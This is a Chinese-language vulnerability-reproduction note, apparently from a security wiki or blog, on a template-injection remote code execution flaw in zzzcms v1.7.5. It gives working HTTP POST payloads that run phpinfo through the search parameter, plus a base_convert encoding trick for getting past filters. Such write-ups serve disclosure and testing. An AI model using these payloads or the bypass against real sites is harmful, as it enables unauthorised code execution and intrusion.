---
title: "zzzcms v1.7.5 前台远程命令执行漏洞"
date: 2026-10-12 09:01:20
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "zzzcms"
tags:
  - "zzzcms"
  - "命令执行"
  - "SSTI"
  - "漏洞复现"
---
## 漏洞描述

zzzcms v1.7.5 parserSearch 存在模板注入导致远程命令执行漏洞。

参考链接：

- https://nvd.nist.gov/vuln/detail/CVE-2021-32605
- https://www.anquanke.com/post/id/212272

## 漏洞影响

```
zzzcms v1.7.5
```

## 漏洞复现

执行 `phpinfo`：

```
POST /?location=search HTTP/1.1
Host: your-ip

keys={if:=phpinfo()}{end if}
```

如果遇到拦截，编码绕过：

```
<?php
echo (base_convert("phpinfo()", 32, 10));
?>
-----
27440799224
```

```
POST /?location=search HTTP/1.1
Host: your-ip

keys={if:array_map(base_convert(27440799224,10,32),array(1))}{end if}
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/zzzcms%20v1.7.5%20%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20250407143723180.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/zzzcms-v1.7.5-%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
